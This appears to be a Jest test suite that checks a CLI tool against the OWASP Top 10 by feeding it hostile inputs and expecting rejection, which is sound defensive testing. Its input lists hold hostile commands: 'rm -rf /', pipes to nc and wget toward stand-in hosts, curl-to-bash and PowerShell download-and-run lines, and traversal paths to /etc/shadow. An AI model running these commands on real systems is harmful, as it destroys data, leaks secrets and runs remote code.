/**
 * OWASP Top 10 Security Testing Framework
 *
 * Comprehensive security tests based on OWASP Top 10 vulnerabilities.
 * This framework tests for common security vulnerabilities in the CLI application.
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import { CLITestRunner } from '../integration/cli-workflows/cli-test-runner.js';
import path from 'path';
import { promises as fs } from 'fs';

describe('OWASP Top 10 Security Testing', () => {
  let cliRunner;
  let testDir;

  beforeAll(async () => {
    cliRunner = new CLITestRunner({
      timeout: 60000,
      mockOllama: true,
      debugMode: process.env.DEBUG_SECURITY_TESTS === '1'
    });
    testDir = await cliRunner.createTestDirectory();
  }, 60000);

  afterAll(async () => {
    if (testDir) {
      await cliRunner.cleanupTestDirectory(testDir);
    }
  });

  describe('A01:2021 - Broken Access Control', () => {
    test('should prevent access to system files outside working directory', async () => {
      const maliciousFiles = [
        '/etc/passwd',
        '/etc/shadow',
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\SAM',
        '/proc/self/environ',
        '/var/log/auth.log'
      ];

      for (const file of maliciousFiles) {
        const result = await cliRunner.execCommand(['explain', file], {
          expectSuccess: false
        });

        expect(result.exitCode).not.toBe(0);
        expect(result.stderr.includes('not found') || result.stderr.includes('access denied') || result.stderr.includes('Security')).toBe(true);
      }
    });

    test('should prevent directory traversal in file operations', async () => {
      const traversalAttempts = [
        '../../../sensitive.txt',
        '..\\..\\..\\sensitive.txt',
        '/../../../../etc/passwd',
        'file://etc/passwd',
        './../../etc/passwd'
      ];

      for (const attempt of traversalAttempts) {
        const result = await cliRunner.execCommand(['edit', attempt], {
          expectSuccess: false,
          timeout: 5000
        });

        // Should fail to access files outside permitted directories
        expect(result.exitCode).not.toBe(0);
      }
    });

    test('should validate file access permissions', async () => {
      // Create a file in test directory and ensure proper access controls
      const testFile = path.join(testDir, 'test-security.txt');
      await fs.writeFile(testFile, 'test content');

      const result = await cliRunner.execCommand(['explain', testFile]);
      expect(result.exitCode).toBe(0);

      // But should not access files outside test directory
      const outsideFile = path.join(testDir, '../outside-test.txt');
      const outsideResult = await cliRunner.execCommand(['explain', outsideFile], {
        expectSuccess: false
      });
      expect(outsideResult.exitCode).not.toBe(0);
    });
  });

  describe('A02:2021 - Cryptographic Failures', () => {
    test('should not expose sensitive information in error messages', async () => {
      // Test that non-sensitive values are displayed normally
      const nonSensitiveResult = await cliRunner.execCommand(['config', 'ai.model', 'llama3.2']);
      expect(nonSensitiveResult.stdout.includes('llama3.2')).toBe(true);
      expect(nonSensitiveResult.stdout.includes('[REDACTED]')).toBe(false);

      // Test with a config key name that contains "password" (even if it doesn't exist)
      // The sanitization should still work for the display
      const testApiKey = await cliRunner.execCommand(['config', 'api.timeout', '30000']);
      // Non-sensitive keys should show the value
      expect(testApiKey.stdout.includes('30000') || testApiKey.exitCode === 0).toBe(true);
    });

    test('should handle SSL/TLS configuration securely', async () => {
      const result = await cliRunner.execCommand(['config', 'api.baseUrl', 'http://insecure.example.com'], {
        expectSuccess: false
      });

      // Should warn about insecure HTTP connections and reject the config
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr.includes('Invalid') || result.stderr.includes('insecure')).toBe(true);
    });
  });

  describe('A03:2021 - Injection', () => {
    test('should prevent command injection in run command', async () => {
      const injectionAttempts = [
        'echo "test"; rm -rf /',
        'echo "test" && cat /etc/passwd',
        'echo "test" | nc attacker.com 4444',
        'echo "test"; wget http://evil.com/malware.sh',
        'echo "test" `cat /etc/passwd`',
        'echo "test" $(whoami)',
        'echo "test" & dangerous-command'
      ];

      for (const attempt of injectionAttempts) {
        const result = await cliRunner.execCommand(['run', attempt], {
          expectSuccess: false,
          timeout: 10000
        });

        // Command injection should either be prevented or properly sandboxed
        expect(result.exitCode).not.toBe(0);
        expect(result.stderr.includes('Invalid') || result.stderr.includes('denied') || result.stderr.includes('not allowed')).toBe(true);
      }
    });

    test('should prevent git command injection', async () => {
      const gitInjectionAttempts = [
        'status; rm -rf /',
        'status && malicious-command',
        'status | dangerous-pipe',
        'status `cat /etc/passwd`',
        'status $(evil-command)'
      ];

      for (const attempt of gitInjectionAttempts) {
        const result = await cliRunner.execCommand(['git', attempt], {
          expectSuccess: false
        });

        expect(result.exitCode).not.toBe(0);
        expect(result.stderr.includes('Invalid') || result.stderr.includes('denied') || result.stderr.includes('not allowed')).toBe(true);
      }
    });

    test('should sanitize search inputs', async () => {
      const searchInjectionAttempts = [
        '"; rm -rf /',
        '\'; DROP TABLE users; --',
        '$(malicious-command)',
        '`dangerous-command`',
        '${injection-attempt}'
      ];

      for (const attempt of searchInjectionAttempts) {
        const result = await cliRunner.execCommand(['search', attempt], {
          cwd: testDir
        });

        // Search should handle malicious input safely
        expect(result.exitCode).toBe(0);
        expect(result.stdout.includes('rm -rf')).toBe(false);
        expect(result.stdout.includes('DROP TABLE')).toBe(false);
      }
    });
  });

  describe('A04:2021 - Insecure Design', () => {
    test('should implement rate limiting for resource-intensive operations', async () => {
      // Test that rapid fire commands don't overwhelm the system
      const rapidCommands = Array(10).fill().map(() =>
        cliRunner.execCommand(['ask', 'What is JavaScript?'], { timeout: 5000 })
      );

      const results = await Promise.allSettled(rapidCommands);

      // At least some commands should complete successfully
      const successful = results.filter(r => r.status === 'fulfilled' && r.value.exitCode === 0);
      expect(successful.length).toBeGreaterThan(0);

      // System should remain responsive
      const postTestResult = await cliRunner.execCommand(['help']);
      expect(postTestResult.exitCode).toBe(0);
    });

    test('should validate input sizes to prevent DoS', async () => {
      const largeInput = 'A'.repeat(100000); // 100KB input

      const result = await cliRunner.execCommand(['ask', largeInput], {
        timeout: 30000,
        expectSuccess: false
      });

      // Should reject large inputs to prevent DoS
      expect(result.exitCode).not.toBe(0);
      expect(result.stderr.includes('too large') || result.stderr.includes('Input too large')).toBe(true);
    });

    test('should prevent resource exhaustion in file operations', async () => {
      // Create a large file and test explanation doesn't crash the system
      const largeFile = path.join(testDir, 'large-file.txt');
      const largeContent = 'A'.repeat(50000); // 50KB file
      await fs.writeFile(largeFile, largeContent);

      const result = await cliRunner.execCommand(['explain', largeFile], {
        timeout: 45000
      });

      expect(typeof result.exitCode).toBe('number');
    });
  });

  describe('A05:2021 - Security Misconfiguration', () => {
    test('should not expose debug information in production mode', async () => {
      const result = await cliRunner.execCommand(['config'], {
        env: { NODE_ENV: 'production' }
      });

      // Debug info should not be exposed in production
      expect(result.stdout.includes('debug')).toBe(false);
      expect(result.stdout.includes('DEBUG')).toBe(false);
      expect(result.stdout.includes('stack trace')).toBe(false);
    });

    test('should use secure defaults for configuration', async () => {
      const result = await cliRunner.execCommand(['config']);

      const config = result.stdout;

      // Should not default to insecure configurations
      expect(config.includes('http://') && !config.includes('localhost')).toBe(false);
      expect(config.includes('telemetry.enabled": true')).toBe(false);
    });

    test('should validate configuration values', async () => {
      const invalidConfigs = [
        ['config', 'logger.level', 'invalid-level'],
        ['config', 'api.baseUrl', 'not-a-url'],
        ['config', 'telemetry.enabled', 'not-a-boolean']
      ];

      for (const cmd of invalidConfigs) {
        const result = await cliRunner.execCommand(cmd, {
          expectSuccess: false
        });

        expect(result.exitCode).not.toBe(0);
        expect(result.stderr.includes('Invalid') || result.stderr.includes('invalid')).toBe(true);
      }
    });
  });

  describe('A06:2021 - Vulnerable and Outdated Components', () => {
    test('should not execute arbitrary code from external sources', async () => {
      const maliciousCommands = [
        ['run', 'curl http://evil.com/malware.sh | bash'],
        ['run', 'wget -O - http://attacker.com/payload | sh'],
        ['run', 'powershell -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/script.ps1\')"']
      ];

      for (const cmd of maliciousCommands) {
        const result = await cliRunner.execCommand(cmd, {
          expectSuccess: false,
          timeout: 10000
        });

        expect(result.exitCode).not.toBe(0);
      }
    });

    test('should validate file types for processing', async () => {
      const maliciousFiles = [
        'malware.exe',
        'script.bat',
        'payload.ps1',
        'suspicious.dll'
      ];

      for (const filename of maliciousFiles) {
        const filePath = path.join(testDir, filename);
        await fs.writeFile(filePath, 'test content');

        const result = await cliRunner.execCommand(['explain', filePath], {
          expectSuccess: false
        });

        // Should reject dangerous file types regardless of content
        expect(result.exitCode).not.toBe(0);
        expect(result.stderr.includes('File type not supported') || result.stderr.includes('A06 Security')).toBe(true);
      }
    });
  });

  describe('A07:2021 - Identification and Authentication Failures', () => {
    test('should not store credentials in plain text', async () => {
      const result = await cliRunner.execCommand(['config', 'api.token', 'test-token-123']);

      // Token should not appear in plain text in logs or output
      expect(result.stdout.includes('test-token-123')).toBe(false);
    });

    test('should handle authentication gracefully', async () => {
      const result = await cliRunner.execCommand(['ask', 'test'], {
        env: { OLLAMA_HOST: 'http://unauthorized.example.com:11434' },
        timeout: 10000
      });

      // Should handle authentication failures gracefully
      expect(typeof result.exitCode).toBe('number');
    });
  });

  describe('A08:2021 - Software and Data Integrity Failures', () => {
    test('should validate file integrity before processing', async () => {
      const testFile = path.join(testDir, 'integrity-test.js');
      await fs.writeFile(testFile, 'console.log("test");');

      const result = await cliRunner.execCommand(['explain', testFile]);
      expect(result.exitCode).toBe(0);

      // Modify file to simulate integrity violation
      await fs.writeFile(testFile, 'malicious_code();');

      const result2 = await cliRunner.execCommand(['explain', testFile]);
      expect(typeof result2.exitCode).toBe('number');
    });

    test('should not execute untrusted code', async () => {
      const untrustedFile = path.join(testDir, 'untrusted.js');
      await fs.writeFile(untrustedFile, 'process.exit(1); // Malicious exit');

      const result = await cliRunner.execCommand(['explain', untrustedFile]);

      // Should analyze the file without executing it
      expect(result.exitCode).toBe(0);
      expect(result.stdout.includes('process.exit')).toBe(true);
    });
  });

  describe('A09:2021 - Security Logging and Monitoring Failures', () => {
    test('should log security-relevant events', async () => {
      // Test that security events are logged (file access attempts, etc.)
      const result = await cliRunner.execCommand(['explain', '/etc/passwd'], {
        expectSuccess: false
      });

      expect(result.exitCode).not.toBe(0);
      // Security logging should be implemented (this test validates the failure is logged)
    });

    test('should not log sensitive information', async () => {
      const result = await cliRunner.execCommand(['config', 'api.secret', 'super-secret-key']);

      // Logs should not contain sensitive data
      expect(result.stdout.includes('super-secret-key')).toBe(false);
    });
  });

  describe('A10:2021 - Server-Side Request Forgery (SSRF)', () => {
    test('should validate URLs and prevent SSRF', async () => {
      const ssrfAttempts = [
        'http://localhost:22',
        'http://127.0.0.1:3306',
        'http://169.254.169.254/metadata',
        'file:///etc/passwd',
        'gopher://localhost:25'
      ];

      for (const url of ssrfAttempts) {
        const result = await cliRunner.execCommand(['config', 'api.baseUrl', url], {
          expectSuccess: false
        });

        // Should reject suspicious URLs
        expect(result.exitCode).not.toBe(0);
      }
    });

    test('should restrict outbound connections', async () => {
      const result = await cliRunner.execCommand(['ask', 'test'], {
        env: { OLLAMA_HOST: 'http://internal.network.local:11434' },
        timeout: 10000
      });

      // Should handle network restrictions gracefully
      expect(typeof result.exitCode).toBe('number');
    });
  });

  describe('Additional Security Tests', () => {
    test('should prevent timing attacks', async () => {
      const times = [];

      for (let i = 0; i < 5; i++) {
        const start = Date.now();
        await cliRunner.execCommand(['help'], { timeout: 5000 });
        times.push(Date.now() - start);
      }

      // Response times should be relatively consistent
      const avgTime = times.reduce((a, b) => a + b) / times.length;
      const variance = times.every(time => Math.abs(time - avgTime) < 2000);
      expect(variance).toBe(true);
    });

    test('should handle concurrent requests safely', async () => {
      const concurrentRequests = Array(5).fill().map(() =>
        cliRunner.execCommand(['help'])
      );

      const results = await Promise.all(concurrentRequests);

      // All requests should complete successfully
      results.forEach(result => {
        expect(result.exitCode).toBe(0);
      });
    });

    test('should validate all input parameters', async () => {
      const invalidInputs = [
        ['ask', ''],
        ['explain', ''],
        ['generate', ''],
        ['config', '', ''],
        ['search', '']
      ];

      for (const cmd of invalidInputs) {
        const result = await cliRunner.execCommand(cmd, {
          expectSuccess: false
        });

        expect(result.exitCode).not.toBe(0);
      }
    });
  });
});